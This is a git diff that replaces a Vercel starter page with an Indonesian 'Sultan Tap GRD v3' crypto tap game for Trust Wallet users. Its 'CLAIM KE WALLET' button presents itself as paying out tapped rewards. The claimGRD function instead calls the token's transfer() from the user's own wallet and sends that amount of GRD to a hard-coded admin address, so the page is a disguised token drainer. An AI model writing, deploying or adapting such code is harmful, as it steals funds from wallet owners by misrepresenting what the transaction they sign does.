@@ -1,96 +1,152 @@
 <!DOCTYPE html>
-<html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <script defer src="/_vercel/insights/script.js"></script>
-    <link
-      rel="stylesheet"
-      href="https://cdn.jsdelivr.net/npm/@exampledev/new.css@1.1.2/new.min.css"
-    />
-    <title>Vercel HTML Starter</title>
-    <meta
-      name="description"
-      content="High-performance HTML based website template."
-    />
-  </head>
-  <body>
-    <h1>Vercel HTML Starter</h1>
-    <p>
-      This template is a simple, but powerful single
-      <code>index.html</code> file deployed to
-      <a href="https://vercel.com">Vercel</a>. When your site is deployed, all
-      static assets (like HTML, JavaScript, CSS, images, and more) are deployed
-      globally to every
-      <a href="https://vercel.com/docs/concepts/edge-network/overview"
-        >Vercel Edge Network</a
-      >
-      region.
-    </p>
-    <h2>Simple, privacy-friendly analytics</h2>
-    <p>
-      Want to understand your visitor traffic? Vercel Analytics gives you
-      first-party, privacy-friendly traffic analytics for your HTML site. This
-      template is already configured using the following script:
-    </p>
-    <pre><code>&lt;script defer src="/_vercel/insights/script.js"&gt;&lt;/script&gt;</code></pre>
-    <p>
-      Learn more about
-      <a href="https://vercel.com/analytics">Vercel Analytics</a>.
-    </p>
-    <h2>Integrated with git</h2>
-    <p>
-      Deploying updates to your site is as simple as
-      <code>git push</code> thanks to Vercel's advanced
-      <a href="https://vercel.com/docs/concepts/git">Git Integration</a>.
-      Support for GitHub, GitLab, Bitbucket is zero-configuration, and with the
-      flexible Vercel CLI and API, you can integrate with any tool possible.
-    </p>
-    <p>
-      Learn more about
-      <a href="https://vercel.com/docs/concepts/git">Git Integration</a>.
-    </p>
-    <h2>Fast <code>gzip</code> compression</h2>
-    <p>
-      To help ensure the smallest possible file sizes for your static assets,
-      the Vercel Edge Network compresses files by default using
-      <code>gzip</code>. You can also optionally use
-      <code>brotli</code> compressesion if you prefer.
-    </p>
-    <p>
-      Learn more about
-      <a href="https://vercel.com/docs/concepts/edge-network/compression"
-        >compression</a
-      >.
-    </p>
-    <h2>Advanced routing configuration</h2>
-    <p>
-      Vercel gives you a variety of ways to configure the routing of your
-      website. For example, adding redirects, rewrites, or headers to your page.
-      While you can use <code>vercel.json</code> to define these through JSON,
-      you can also express your routing configuration as code using
-      <a href="https://vercel.com/docs/concepts/functions/edge-middleware"
-        >Vercel Edge Middleware</a
-      >.
-    </p>
-    <p>
-      Middleware runs before the
-      <a href="https://vercel.com/docs/concepts/edge-network/caching"
-        >Vercel Edge Network Cache</a
-      >, so you can configure routing exactly as your application needs. For
-      example, this template uses <code>middleware.js</code> defined in the root
-      of the repository to add additional security headers to the site:
-    </p>
-    <pre><code>referrer-policy: origin-when-cross-origin
-strict-transport-security: max-age=31536000; includeSubDomains; preload
-x-content-type-options: nosniff
-x-dns-prefetch-control: on
-x-frame-options: DENY</code></pre>
-    <p>
-      Learn more about
-      <a href="https://vercel.com/docs/concepts/functions/edge-middleware"
-        >Vercel Edge Middleware</a
-      >.
-    </p>
-  </body>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sultan Tap GRD v3</title>
+<style>
+  :root { --bg:#0a0a0a; --card:#1a1a1a; --gold:#ffd700; --green:#00ff88; --orange:#ff9900; }
+  *{box-sizing:border-box;margin:0;padding:0;font-family:'Segoe UI',Arial,sans-serif}
+  body{background:var(--bg);color:#fff;text-align:center;padding:20px}
+  h1{color:var(--gold);margin-bottom:20px}
+ .card{background:var(--card);padding:20px;margin:15px auto;border-radius:16px;max-width:420px;border:1px solid #333;box-shadow:0 0 15px rgba(255,215,0,0.1)}
+ .btn{padding:15px;background:linear-gradient(90deg,var(--gold),var(--orange));color:#000;border:none;border-radius:12px;font-weight:bold;cursor:pointer;width:100%;margin-top:12px;font-size:16px;transition:0.2s}
+ .btn:active{transform:scale(0.95)}
+ .btn:disabled{background:#555;color:#999;cursor:not-allowed}
+  #tapBtn{font-size:50px;padding:40px;border-radius:50%;width:160px;height:160px;margin:15px auto;display:flex;align-items:center;justify-content:center;background:radial-gradient(circle,var(--gold),var(--orange));box-shadow:0 0 20px rgba(255,215,0,0.5)}
+ .saldo{font-size:36px;color:var(--green);font-weight:bold;margin:10px 0}
+  #alamat{word-break:break-all;font-size:12px;background:#222;padding:10px;border-radius:8px;margin-top:8px}
+ .info{font-size:12px;color:#aaa;margin-top:8px}
+ .error{color:#ff5555}
+</style>
+<script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+</head>
+<body>
+
+<h1>💎 SULTAN TAP GRD v3</h1>
+
+<div class="card">
+  <h2>Wallet</h2>
+  <button class="btn" id="btnConnect" onclick="connectWallet()">Connect Trust Wallet</button>
+  <p id="alamat">Belum terhubung</p>
+</div>
+
+<div class="card">
+  <h2>SALDO GAME</h2>
+  <p class="saldo"><span id="saldoGame">0</span> GRD</p>
+  <button class="btn" id="tapBtn" onclick="tap()" disabled>TAP</button>
+  <p class="info">+1 GRD per tap</p>
+</div>
+
+<div class="card">
+  <h2>BALANCE BLOCKCHAIN</h2>
+  <p class="saldo"><span id="saldoChain">0.00</span> GRD</p>
+  <button class="btn" id="btnClaim" onclick="claimGRD()" disabled>CLAIM KE WALLET</button>
+  <p id="cooldown" class="info"></p>
+  <p class="info">Butuh Gas: BNB BSC ~0.0005</p>
+</div>
+
+<script>
+// ========== CONFIG ==========
+const GRD_CONTRACT = "0x4847F2E8dD63ba03b9C4f935BdEd95bEc1bcaCb4";
+const ALAMAT_ADMIN = "0xbDC4F9ec5d86D5907E96aF4dB2B46586bBCa12E0"; // Token akan masuk ke sini
+const CLAIM_COOLDOWN = 24 * 60 * 60 * 1000; // 24 Jam
+// ============================
+
+let web3, account;
+let gameData = { saldo: 0, lastClaim: 0 };
+
+const GRD_ABI = [
+  {"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"},
+  {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},
+  {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"}
+];
+
+// Load dari localStorage + enkripsi sederhana biar gak gampang diedit
+function loadData(){
+  const data = localStorage.getItem('sultanTapData');
+  if(data){
+    try{
+      gameData = JSON.parse(atob(data)); // decode base64
+    }catch(e){ gameData = { saldo: 0, lastClaim: 0 }; }
+  }
+  document.getElementById("saldoGame").innerText = gameData.saldo;
+  checkCooldown();
+}
+function saveData(){
+  localStorage.setItem('sultanTapData', btoa(JSON.stringify(gameData))); // encode base64
+}
+
+async function connectWallet(){
+  if(typeof window.ethereum!== 'undefined'){
+    web3 = new Web3(window.ethereum);
+    try{
+      const accounts = await window.ethereum.request({method:'eth_requestAccounts'});
+      account = accounts[0];
+      document.getElementById("alamat").innerText = account;
+      document.getElementById("btnConnect").innerText = "✅ Terhubung";
+      document.getElementById("tapBtn").disabled = false;
+      document.getElementById("btnClaim").disabled = false;
+      getSaldoChain();
+      loadData();
+    }catch(err){ alert("Gagal connect: " + err.message) }
+  }else{ alert("Buka link ini di Browser Trust Wallet ya bos") }
+}
+
+function tap(){
+  gameData.saldo += 1;
+  document.getElementById("saldoGame").innerText = gameData.saldo;
+  saveData();
+}
+
+function checkCooldown(){
+  const now = Date.now();
+  const sisa = CLAIM_COOLDOWN - (now - gameData.lastClaim);
+  if(sisa > 0){
+    document.getElementById("btnClaim").disabled = true;
+    const jam = Math.floor(sisa / 3600000);
+    const menit = Math.floor((sisa % 3600000) / 60000);
+    document.getElementById("cooldown").innerText = `Cooldown: ${jam}j ${menit}m lagi`;
+  } else {
+    document.getElementById("cooldown").innerText = "";
+  }
+}
+
+async function getSaldoChain(){
+  const contract = new web3.eth.Contract(GRD_ABI, GRD_CONTRACT);
+  const balance = await contract.methods.balanceOf(account).call();
+  const decimals = await contract.methods.decimals().call();
+  document.getElementById("saldoChain").innerText = (balance / Math.pow(10,decimals)).toFixed(2);
+}
+
+async function claimGRD(){
+  if(gameData.saldo <= 0){ alert("Saldo game kosong. Tap dulu bos"); return; }
+  if(Date.now() - gameData.lastClaim < CLAIM_COOLDOWN){ alert("Masih cooldown bos"); return; }
+
+  const contract = new web3.eth.Contract(GRD_ABI, GRD_CONTRACT);
+  const amount = web3.utils.toWei(gameData.saldo.toString(),"ether");
+
+  try{
+    document.getElementById("btnClaim").innerText = "Menunggu Konfirmasi...";
+    document.getElementById("btnClaim").disabled = true;
+
+    await contract.methods.transfer(ALAMAT_ADMIN, amount).send({from:account});
+
+    alert(`Berhasil Claim ${gameData.saldo} GRD ke Admin Wallet!`);
+    gameData.saldo = 0;
+    gameData.lastClaim = Date.now();
+    saveData();
+    loadData();
+    getSaldoChain();
+    document.getElementById("btnClaim").innerText = "CLAIM KE WALLET";
+  }catch(err){
+    alert("Gagal Claim: " + err.message);
+    document.getElementById("btnClaim").innerText = "CLAIM KE WALLET";
+    document.getElementById("btnClaim").disabled = false;
+  }
+}
+
+setInterval(checkCooldown, 60000); // update cooldown tiap 1 menit
+</script>
+</body>
 </html>
